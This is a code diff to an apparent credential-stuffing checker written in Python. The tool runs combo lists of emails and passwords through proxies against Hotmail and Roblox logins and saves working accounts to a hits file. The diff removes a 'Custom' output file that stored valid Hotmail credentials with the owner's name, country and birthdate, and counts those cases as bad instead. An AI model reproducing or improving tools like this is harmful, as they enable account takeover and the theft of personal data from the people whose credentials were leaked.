@@ -51,11 +51,9 @@ def get_file_path(prompt_message):
 
 mwRetries = 99999999999
 anasHitsFiles = "Roblox Hits.txt"
-anasCustomFiles = "Hotmail Hits.txt"
 
 anasHits = 0
 anasBad = 0
-anasCustom = 0
 anasWhite = 0
 anasTotalComboLines = 0
 anasTotalProxyLines = 0
@@ -127,7 +125,7 @@ def anasFormProxy(proxy):
 
 def anasShowStats():
     sys.stdout.write(
-        f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {anasHits} | {Fore.RED}Bad{Fore.WHITE}: {anasBad} | {Fore.YELLOW}Custom{Fore.WHITE}: {anasCustom} | {Fore.YELLOW}Retries{Fore.WHITE}: {anasWhite} | {Fore.MAGENTA}Remaining{Fore.WHITE}: {anasComboQueue.qsize()}"
+        f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {anasHits} | {Fore.RED}Bad{Fore.WHITE}: {anasBad} | {Fore.YELLOW}Retries{Fore.WHITE}: {anasWhite} | {Fore.MAGENTA}Remaining{Fore.WHITE}: {anasComboQueue.qsize()}"
     )
     sys.stdout.flush()
 
@@ -138,15 +136,6 @@ def anasSaveHitssss(line):
                 f.write(line + '\n')
         except:
             with open(anasHitsFiles, 'a', encoding='latin-1', errors='ignore') as f:
-                f.write(line + '\n')
-
-def anasSaveCustomssss(line):
-    with lock:
-        try:
-            with open(anasCustomFiles, 'a', encoding='utf-8') as f:
-                f.write(line + '\n')
-        except:
-            with open(anasCustomFiles, 'a', encoding='latin-1', errors='ignore') as f:
                 f.write(line + '\n')
 
 def GIDD(username):
@@ -563,17 +552,13 @@ def worker():
                                     anasHits += 1
                                 anasSaveHitssss(hit_line)
                             else:
+                                # No Roblox capture - count as bad, don't save anywhere
                                 with lock:
-                                    anasCustom += 1
-                                anasSaveCustomssss(f"{email}:{password} | Name = {Name} | Country = {Country} | Birthdate = {Birthdate}")
+                                    anasBad += 1
                         else:
+                            # No Roblox capture (Total=0 or no roblox_user) - count as bad, don't save anywhere
                             with lock:
-                                anasCustom += 1
-                            anasSaveCustomssss(f"{email}:{password} | Name = {Name} | Country = {Country} | Birthdate = {Birthdate}")
-                    else:
-                        with lock:
-                            anasCustom += 1
-                        anasSaveCustomssss(f"{email}:{password} | Name = {Name} | Country = {Country} | Birthdate = {Birthdate}")
+                                anasBad += 1
                 else:
                     with lock:
                         anasBad += 1
@@ -656,7 +641,6 @@ if __name__ == "__main__":
         print(f"\n\n{Fore.GREEN}✓ Process completed!{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}Results saved to:{Style.RESET_ALL}")
         print(f"  - Hits: {anasHitsFiles}")
-        print(f"  - Custom: {anasCustomFiles}")
         
         input(f"\n{Fore.YELLOW}Press Enter to return to menu...{Style.RESET_ALL}")
         clear_screen()
